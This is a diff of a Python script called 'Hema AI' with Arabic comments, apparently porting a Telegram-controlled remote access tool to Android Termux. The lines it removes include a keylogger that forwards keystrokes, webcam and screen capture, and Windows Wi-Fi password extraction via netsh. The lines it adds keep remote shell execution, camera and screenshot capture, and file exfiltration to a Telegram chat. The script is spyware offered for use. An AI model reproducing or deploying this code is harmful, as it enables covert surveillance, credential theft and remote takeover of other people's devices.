@@ -1,19 +1,14 @@
-import platform
 import os
 import threading
 import telebot
 from colorama import init, Fore, Style
-import tkinter as tk
-from tkinter import messagebox
-import pyautogui
-import cv2
-from pynput.keyboard import Listener
 import subprocess
 import webbrowser
 import psutil
 import socket
 import time
 
+# تهيئة الألوان
 init()
 
 # البوت الأساسي
@@ -26,7 +21,7 @@ SECONDARY_TOKEN = "YOUR_BOT_TOKEN"  # استبدلها بتوكين البوت �
 SECONDARY_CHAT_ID = "YOUR_CHAT_ID"  # استبدلها بـ Chat ID الخاص بك
 secondary_bot = telebot.TeleBot(SECONDARY_TOKEN)
 
-DEFAULT_PASSWORD = "01202060839"
+# الشعار
 LOGO = [
     "██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗",
     "██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║",
@@ -36,99 +31,71 @@ LOGO = [
     "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═╝"
 ]
 
-OS = platform.system()
-DEVICE_NAME = platform.node()
+DEVICE_NAME = socket.gethostname()
 running_tasks = {}
 connected_devices = {}
 
+# عرض الشعار
 def display_logo():
     colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
     for i, line in enumerate(LOGO):
         print(colors[i % len(colors)] + line + Style.RESET_ALL)
 
-def login_window():
-    def check_password():
-        if entry.get() == DEFAULT_PASSWORD:
-            root.destroy()
-            start_bots()
-        else:
-            messagebox.showerror("خطأ", "كلمة المرور غير صحيحة!")
-    root = tk.Tk()
-    root.title("Hema AI - تسجيل الدخول")
-    root.geometry("400x500")
-    root.configure(bg="#1e1e2f")
-    logo_label = tk.Label(root, text="\n".join(LOGO), font=("Courier", 10), fg="#00ffcc", bg="#1e1e2f")
-    logo_label.pack(pady=20)
-    tk.Label(root, text="أدخل كلمة المرور:", font=("Arial", 12), fg="#ffffff", bg="#1e1e2f").pack(pady=10)
-    entry = tk.Entry(root, show="*", font=("Arial", 12), bg="#2d2d44", fg="#00ffcc")
-    entry.pack(pady=10)
-    tk.Button(root, text="تسجيل الدخول", command=check_password, font=("Arial", 12), bg="#ff5555", fg="#ffffff").pack(pady=20)
-    root.mainloop()
-
+# وظائف الأداة (معدلة لـ Termux)
 def take_screenshot():
-    screenshot = pyautogui.screenshot()
-    screenshot.save("screen.png")
+    # استخدام termux-api لالتقاط الشاشة
+    os.system("termux-screenshot screen.png")
     with open("screen.png", "rb") as photo:
         secondary_bot.send_photo(SECONDARY_CHAT_ID, photo)
 
 def start_camera():
-    cap = cv2.VideoCapture(0)
-    ret, frame = cap.read()
-    if ret:
-        cv2.imwrite("camera.jpg", frame)
-        with open("camera.jpg", "rb") as photo:
-            secondary_bot.send_photo(SECONDARY_CHAT_ID, photo)
-    cap.release()
+    # استخدام termux-api لالتقاط صورة
+    os.system("termux-camera-photo -c 0 camera.jpg")
+    with open("camera.jpg", "rb") as photo:
+        secondary_bot.send_photo(SECONDARY_CHAT_ID, photo)
 
 def restart_device():
-    if OS == "Windows":
-        os.system("shutdown /r /t 0")
-    else:
-        os.system("reboot")
-
-def execute_cmd(cmd):
-    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    secondary_bot.send_message(SECONDARY_CHAT_ID, result.stdout or result.stderr or "تم التنفيذ")
-
-def open_link(url):
-    webbrowser.open(url)
+    os.system("reboot")  # تحتاج إلى صلاحيات root
 
 def execute_shell(cmd):
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
     secondary_bot.send_message(SECONDARY_CHAT_ID, result.stdout or result.stderr or "تم التنفيذ")
 
-def get_passwords():
-    if OS == "Windows":
-        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')
-        profiles = [line.split(":")[1].strip() for line in data.split('\n') if "All User Profile" in line]
-        for profile in profiles:
-            details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8')
-            secondary_bot.send_message(SECONDARY_CHAT_ID, details)
+def open_link(url):
+    os.system(f"termux-open-url {url}")
+
+def upload_file(file_path):
+    # تحميل ملف من الجهاز إلى تيليجرام
+    if os.path.exists(file_path):
+        with open(file_path, "rb") as file:
+            secondary_bot.send_document(SECONDARY_CHAT_ID, file)
     else:
-        secondary_bot.send_message(SECONDARY_CHAT_ID, "استخراج كلمات المرور لـ Windows فقط.")
+        secondary_bot.send_message(SECONDARY_CHAT_ID, "الملف غير موجود.")
+
+def play_file(file_path):
+    # تشغيل ملف (صوت/فيديو) على الجهاز
+    if os.path.exists(file_path):
+        os.system(f"termux-open {file_path}")
+    else:
+        secondary_bot.send_message(SECONDARY_CHAT_ID, "الملف غير موجود.")
 
 def start_keylogger():
-    def on_press(key):
-        secondary_bot.send_message(SECONDARY_CHAT_ID, f"تم تسجيل: {key}")
-    listener = Listener(on_press=on_press)
-    listener.start()
-    running_tasks["keylogger"] = listener
+    # تسجيل ضربات المفاتيح (محدود في Termux)
+    secondary_bot.send_message(SECONDARY_CHAT_ID, "تسجيل المفاتيح غير مدعوم مباشرة في Termux حاليًا.")
 
 def stop_keylogger():
-    if "keylogger" in running_tasks:
-        running_tasks["keylogger"].stop()
-        del running_tasks["keylogger"]
-        secondary_bot.send_message(SECONDARY_CHAT_ID, "تم إيقاف تسجيل المفاتيح.")
+    secondary_bot.send_message(SECONDARY_CHAT_ID, "لا يوجد تسجيل مفاتيح نشط.")
 
 def get_device_info():
     info = {
         "Device": DEVICE_NAME,
-        "OS": OS,
+        "OS": "Android",
         "CPU": psutil.cpu_percent(),
         "RAM": psutil.virtual_memory().percent
     }
     return info
 
+# إعداد البوت الأساسي
 @master_bot.message_handler(commands=['start'])
 def master_welcome(message):
     if str(message.chat.id) == MASTER_CHAT_ID:
@@ -163,6 +130,7 @@ def forward_command(message):
                 secondary_bot.send_message(info["chat_id"], message.text)
                 break
 
+# إعداد البوت الثانوي
 @secondary_bot.message_handler(commands=['start'])
 def secondary_welcome(message):
     if str(message.chat.id) == SECONDARY_CHAT_ID:
@@ -182,10 +150,10 @@ def handle_commands(message):
         "/screenshot": take_screenshot,
         "/start_camera": start_camera,
         "/restart": restart_device,
-        "/cmd": lambda: execute_cmd(args),
-        "/open_link": lambda: open_link(args),
         "/shell": lambda: execute_shell(args),
-        "/get_passwords": get_passwords,
+        "/open_link": lambda: open_link(args),
+        "/upload_file": lambda: upload_file(args),
+        "/play_file": lambda: play_file(args),
         "/start_keylogger": start_keylogger,
         "/stop_keylogger": stop_keylogger,
     }
@@ -193,14 +161,10 @@ def handle_commands(message):
         threading.Thread(target=commands[cmd], daemon=True).start()
 
 def start_bots():
-    print(Fore.GREEN + "Hema AI يعمل الآن..." + Style.RESET_ALL)
+    print(Fore.GREEN + "Hema AI يعمل الآن على Android..." + Style.RESET_ALL)
     threading.Thread(target=master_bot.polling, daemon=True).start()
     threading.Thread(target=secondary_bot.polling, daemon=True).start()
 
 if __name__ == "__main__":
     display_logo()
-    try:
-        login_window()
-    except:
-        print(Fore.RED + "نافذة تسجيل الدخول غير متاحة، بدء البوت مباشرة..." + Style.RESET_ALL)
-        start_bots()
+    start_bots()
